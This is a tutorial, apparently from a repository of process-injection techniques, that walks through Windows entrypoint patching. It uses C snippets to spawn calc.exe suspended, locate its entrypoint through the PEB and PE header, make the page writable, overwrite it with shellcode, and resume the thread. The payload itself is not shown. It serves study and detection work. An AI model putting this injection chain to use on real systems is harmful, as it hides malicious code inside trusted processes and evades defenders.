# Overview

This method creates a suspended process which will act as a cover since its entrypoint will be patched with a shellcode: in this way the injected code will be run under the identity of the original application, in this case `calc.exe`.

The process will be spawned in a hibernated phase (ie. it will not start automatically afterwards) and then its entrypoint will be substituted with arbitrary code. This is one of the easiest methods to diverge from the expected program behaviour and, at the same time, the most detectable one since the shellcode will be immediately found when checking the entrypoint.

It has to be noted that `calc.exe` will not actually run `calc.exe` alongside the shellcode since part of its code will be overwritten by the shellcode. 

# Process creation

The first thing that has to be done is to create a legit process with [`CreateProcess()`][CreateProcess]. This is accomplished in this way: 
[(source)](CreatePatched#L68-L82)
```c
if (!CreateProcessW((LPWSTR)app_path, // lpApplicationName
                      NULL,             // lpCommandLine
                      NULL,             // lpProcessAttributes
                      NULL,             // lpThreadAttributes
                      NULL,             // bInheritHandles
                      CREATE_SUSPENDED | DETACHED_PROCESS |
                          CREATE_NO_WINDOW, // dwCreationFlags
                      NULL,                 // lpEnvironment
                      NULL,                 // lpCurrentDirectory
                      &si,                  // lpStartupInfo
                      &pi                   // lpProcessInformation
                      )) {
    DBG_ERROR(("CreateProcess failed with error 0x%x\n", GetLastError()));
    return -1;
  }
```
Note the `CREATE_SUSPENDED` flag stops the application from starting automatically after the function call.
If the operation succeeds, the `pi` structure will contain all the information about the newly spawned process.

The execution of the application will be resumed later.

# Calculate the position of the Entrypoint

The entrypoint is where control is transferred from the OS to the binary: the memory pointed by the entrypoint is executable and contains the first instructions run by the application.
In order to change it, we first have to know its address, though.

The required information is located in the **Portable Executable (PE) header**, the file format for executables, object code and DLLs for the Windows operating systems. Here is the official [Microsoft PE and COFF objects specification document][MS PECOFF].

For a quick overview, you can check these resources ([Wikimedia][WM PESTRUCT], [Open RCE poster][ORCE POSTER], [Wikibooks][WB WEF]) which show the header composition and other very useful information.

Let's examine the PE header: [(source)](./CreatePatched.cpp#L85-L89)
```c
  if (ZwQueryInformationProcess(pi.hProcess, 0, &pbi,
                                sizeof(PROCESS_BASIC_INFORMATION), NULL) != 0) {
    DBG_ERROR(("ZwQueryInformation failed with error 0x%x\n", GetLastError()));
    return -1;
  }
```

[`ZwQueryInformationProcess()`][ZwQueryInformationProcess] is called in order to populate the `pbi` structure which will contain the base address of the executable.
It has to be noted that **base address** and **entrypoint** are NOT the same thing since the base address serves as a reference point for other addresses.

The base address and the whole PE header are read through [`ReadProcessMemory()`][ReadProcessMemory]. [(source)](./CreatePatched.cpp#L93-L107)

```c
  if (!ReadProcessMemory(pi.hProcess, (BYTE *)pbi.PebBaseAddress + 8,
                         &BaseAddress, sizeof(BaseAddress), &read_bytes) &&
      read_bytes != sizeof(BaseAddress)) {
    DBG_ERROR(("ReadProcessMemory failed with error 0x%x\n", GetLastError()));
    return -1;
  }
  DBG_SUCC(("Base address: 0x%p\n", BaseAddress));

  DBG_INFO(("Reading PE Header...\n"));
  if (!ReadProcessMemory(pi.hProcess, BaseAddress, header_buf,
                         sizeof(header_buf), &read_bytes) &&
      read_bytes != sizeof(header_buf)) {
    DBG_ERROR(("ReadProcessMemory failed with error 0x%x\n", GetLastError()));
    return -1;
  }
```
The base address can be obtained from the `PEB` opaque structure (mostly undocumented by Microsoft). `pbi.pebAddress+8` points to the second element of the `reserved3` array [(MSDN Documentation)](https://msdn.microsoft.com/it-it/library/windows/desktop/aa813706(v=vs.85).aspx) which corresponds to the image base address ([more here](http://www.nirsoft.net/kernel_struct/vista/PEB.html) and [here](http://www.geoffchappell.com/studies/windows/win32/ntdll/structs/peb/index.htm)). 

To confirm this supposition, `Windbg` provides plenty of information: [(more in the shellcode explanation)](../SHELLCODE.md)
```
0:000> dt ntdll!_PEB
   +0x000 InheritedAddressSpace : UChar
   +0x001 ReadImageFileExecOptions : UChar
   +0x002 BeingDebugged    : UChar
   +0x003 BitField         : UChar
   +0x003 ImageUsesLargePages : Pos 0, 1 Bit
   +0x003 IsProtectedProcess : Pos 1, 1 Bit
   +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit
   +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit
   +0x003 IsPackagedProcess : Pos 4, 1 Bit
   +0x003 IsAppContainer   : Pos 5, 1 Bit
   +0x003 IsProtectedProcessLight : Pos 6, 1 Bit
   +0x003 SpareBits        : Pos 7, 1 Bit
   +0x004 Mutant           : Ptr32 Void
   +0x008 ImageBaseAddress : Ptr32 Void
   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA
   +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS
   +0x014 SubSystemData    : Ptr32 Void
   +0x018 ProcessHeap      : Ptr32 Void
   +0x01c FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION
   +0x020 AtlThunkSListPtr : Ptr32 Void
[snip...]
```

The header is dumped using the previously acquired base address as offset. [(source)](./CreatePatched.cpp#L101-L107)

```c
if (!ReadProcessMemory(pi.hProcess, BaseAddress, header_buf,
                         sizeof(header_buf), &read_bytes) &&
      read_bytes != sizeof(header_buf)) {
    DBG_ERROR(("ReadProcessMemory failed with error 0x%x\n", GetLastError()));
    return -1;
  }
  DBG_SUCC(("Image headers read.\n"));
```

Finally, the header is read and the entrypoint calculated by the `get_opt_hdr` helper function (found in `include/utils.cpp`): [(source)](./CreatePatched.cpp#L117-L118)
```c
  opt_hdr = get_opt_hdr(header_buf);
  ep_rva = opt_hdr.AddressOfEntryPoint;
```

# Injection and execution of the shellcode

It is time to write the shellcode where the entrypoint is pointing to but its memory page is set as read-only (**R--**): to overwrite it we need to set it as writable (**RW-**). This is accomplished by calling [`VirtualProtectEx()`][VirtualProtectEx] which is a function that alters a memory page properties such as executability.
[(source)](./CreatePatched.cpp#L122-L127)
```c
  if (!VirtualProtectEx(pi.hProcess, (BYTE *)BaseAddress + ep_rva,
                        sizeof(g_Shellcode), PAGE_EXECUTE_READWRITE,
                        &oldProtect)) {
    DBG_ERROR(("VirtualProtectEx failed with error 0x%x\n", GetLastError()));
    return -1;
  }
```
It is now possible to write the shellcode on the entrypoint (`BaseAddress + ep_rva`) [(source)](./CreatePatched.cpp#L130-L135)
```c
  if (!WriteProcessMemory(pi.hProcess, (BYTE *)BaseAddress + ep_rva,
                          g_Shellcode, sizeof(g_Shellcode), &read_bytes) &&
      read_bytes != sizeof(g_Shellcode)) {
    DBG_ERROR(("WriteProcessMemory failed with error 0x%x\n", GetLastError()));
    return -1;
  }
```
and finally resume the thread of the original process. [(source)](CreatePatched.cpp#L138)
```c
ResumeThread(pi.hThread);
```


# Resources

* [Source](CreatePatched.cpp)
* [Header](CreatePatched.h)

[MS PECOFF]: http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/pecoff_v83.docx
[WM PESTRUCT]: https://upload.wikimedia.org/wikipedia/commons/7/70/Portable_Executable_32_bit_Structure_in_SVG.svg
[ORCE POSTER]: http://www.openrce.org/reference_library/files/reference/PE%20Format.pdf
[WB WEF]: https://en.wikibooks.org/wiki/X86_Disassembly/Windows_Executable_Files

[CreateProcess]: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx
[ZwQueryInformationProcess]: https://msdn.microsoft.com/en-us/library/windows/desktop/ms687420(v=vs.85).aspx
[ReadProcessMemory]: https://msdn.microsoft.com/en-us/library/windows/desktop/ms680553(v=vs.85).aspx
[VirtualProtectEx]: https://msdn.microsoft.com/en-us/library/windows/desktop/aa366899(v=vs.85).aspx